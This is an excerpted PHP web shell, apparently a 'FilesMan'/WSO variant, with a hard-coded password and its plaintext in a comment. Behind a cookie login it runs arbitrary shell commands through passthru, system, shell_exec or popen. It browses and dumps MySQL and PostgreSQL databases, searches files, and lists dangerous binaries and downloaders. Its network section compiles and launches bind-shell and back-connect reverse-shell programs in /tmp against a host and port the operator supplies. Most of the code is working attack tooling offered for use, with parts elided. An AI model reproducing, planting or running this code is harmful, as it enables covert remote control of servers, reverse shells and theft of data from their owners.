...
//$AAA_1 = "c1d56a4b281d32ab445b9da24963fcc6";		//default
$AAA_1 = "20668c00dc35afc145e4d6a182288783";		//WhiteGem	Password: r8v(SJwEBzxc
$AAA_2 = true;
$AAA_3 = 'UTF-8';
$AAA_4 = 'FilesMan';
$AAA_5 = md5($_SERVER['HTTP_USER_AGENT']);

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $AAA_5);
}
...
if(!empty($AAA_1)) {			// step 1 breakpoint(set important cookie)
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $AAA_1))
        prototype(md5($_SERVER['HTTP_HOST']), $AAA_1);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $AAA_1))
        hardLogin();
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$AAA_2;
...
if( empty($_POST['a']) )
	if(isset($AAA_4) && function_exists('action' . $AAA_4))
		$_POST['a'] = $AAA_4;
	else
		$_POST['a'] = 'FilesMan';
		...
		switch($_POST['p1']) {
			...
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
                    ...
                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));			// ex function usage;
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	...
	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>'ex says' Paste</option>";
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	...
	<!-- particles --> <div id='particles-js'></div><script src='particles.min.js'></script>
...
<input type=hidden name=charset>
	...
	$opt_charsets = '';
	foreach($charsets as $w1key)
		$opt_charsets .= '<option value="'.$w1key.'" '.($_POST['charset']==$w1key?'selected':'').'>'.$w1key.'</option>';
...
function ex($in) {
	...
	if (function_exists('exec')) {
		...
		ob_start();
		@passthru($in);
		$local_value = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$local_value = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$local_value = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$local_value = "";
		while(!@feof($f))
			$local_value .= fread($f,1024);
		pclose($f);
	}else return "'ex says' Unable to execute command\n";
	return ($local_value==''?"'ex says' Query did not return anything\n":$local_value);
}
...
function actionNetwork() {
	...
	if(isset($_POST['p1'])) {
		...
		if($_POST['p1'] == 'bpc') {
			...
			$local_value_2 = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$local_value_2 .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$local_value_2".ex("ps aux | grep bp")."</pre>";
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$local_value_2 = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$local_value_2".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$local_value_2 = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$local_value_2 .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$local_value_2".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$local_value_2 = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$local_value_2".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	hardFooter();
		...
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
                    ...
                    $i = 0;
                    $head = true;
					while($local_value_row = $this->fetch()) {
                        $sql = '';
                        if($i % 1000 == 0) {
                            $head = true;
                            $sql = ";\n\n";
						...
						$columns = array();
						foreach($local_value_row as $k=>$v) {
                            if($v === null)
                                $local_value_row[$k] = "NULL";
                            elseif(is_int($v))
                                $local_value_row[$k] = $v;
                            else
                                $local_value_row[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $local_value_row).')';
                            $head = false;
                        } else
                            $sql .= "\n\t,(".implode(", ", $local_value_row).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
				...
				case 'pgsql':
					...
					while($local_value_row = $this->fetch()) {
						$columns = array();
						foreach($local_value_row as $k=>$v) {
							$local_value_row[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $local_value_row).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
	...
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			...
			while($local_value_row = $db->fetch()) {
				list($key, $value) = each($local_value_row);
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				...
				while($local_value_row = $db->fetch($tbls_res)) {
					list($key, $value) = each($local_value_row);
				...
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					...
					if($db->res !== false) {
						...
						while($local_value_row = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($local_value_row as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($local_value_row);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
...
function actionStringTools() {
	...
	function hardRecursiveGlob($path) {
		...
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $key_ofpaths) {
				if(@is_dir($key_ofpaths)){
					if($path!=$key_ofpaths)
						hardRecursiveGlob($key_ofpaths);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($key_ofpaths), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($key_ofpaths)."\", \"view\",\"\")'>".htmlspecialchars($key_ofpaths)."</a><br>";
				}
			}
		}
	}
...
function actionSecInfo() {
	...
	if($GLOBALS['os'] == 'nix') {
            ...
            if(!$GLOBALS['safe_mode']) {
                ...
                echo '<br>';
                $temp=array();
                foreach ($userful as $value_ofuserful)
                    if(which($value_ofuserful))
                        $temp[] = $value_ofuserful;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $value_ofdanger)
                    if(which($value_ofdanger))
                        $temp[] = $value_ofdanger;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $value_ofdownloader)
                    if(which($value_ofdownloader))
                        $temp[] = $value_ofdownloader;
